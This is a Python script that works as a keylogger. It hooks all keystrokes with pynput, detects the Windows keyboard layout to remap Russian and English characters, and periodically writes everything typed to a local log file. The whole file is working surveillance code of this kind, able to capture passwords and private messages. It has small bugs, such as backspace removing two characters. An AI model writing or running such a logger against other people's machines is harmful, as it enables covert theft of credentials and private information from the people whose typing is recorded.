import time
import ctypes
import threading
import logging
from pynput import keyboard
from layout_mapping import eng_to_rus, rus_to_eng, language_codes

def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409']
    return language


def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += '\n'
    elif key == keyboard.Key.tab:
        text += '\t'
    elif key == keyboard.Key.space:
        text += ' '
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.alt_l:
        pass
    elif key == keyboard.Key.backspace:
        text = text[:-2]
    else:
        if detect_keyboard_layout_win() == 'Russian':
            try:
                text += eng_to_rus[str(key).strip("'")]
            except:
                text += str(key).strip("'")
        else:
            try:
                text += rus_to_eng[str(key).strip("'")]
            except:
                text += str(key).strip("'")


def listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def logger():
    global text
    while True:
        if len(text) > 200:
            logging.info(text)  # Записываем строку в лог-файл
            text = ''
            print("Строка записана в лог-файл")  # Для демонстрации в консоли
        time.sleep(5)




text = ''

logging.basicConfig(filename='text_log.log', level=logging.INFO, format='%(asctime)s - %(message)s')


if __name__ == '__main__':
    thread1 = threading.Thread(target=logger)
    thread2= threading.Thread(target=listener)
    thread1.start()
    thread2.start()
